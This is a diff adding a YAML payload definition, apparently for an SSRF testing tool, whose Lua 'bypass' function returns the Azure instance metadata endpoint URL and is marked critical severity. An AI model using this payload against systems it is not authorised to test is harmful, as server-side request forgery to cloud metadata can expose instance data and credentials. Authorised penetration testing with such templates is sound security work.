@@ -1,0 +1,24 @@
+meta:
+  id: azure_metadata
+  version: 1
+  name: "Azure Metadata Endpoint"
+  description: "Access Azure instance metadata"
+  author: "SSRFdevil"
+  created: "2026-06-19"
+  updated: "2026-06-19"
+  rank: 90
+  confidence: 85
+  severity: critical
+  tags: [azure, metadata, cloud]
+  references: []
+match:
+  schemes: [http]
+  requires: [hostname]
+  supports: [cloud]
+script:
+  language: lua
+  entry: bypass
+  source: |
+    function bypass(ctx)
+      return { url = "http://169.254.169.254/metadata/instance?api-version=2017-08-01" }
+    end
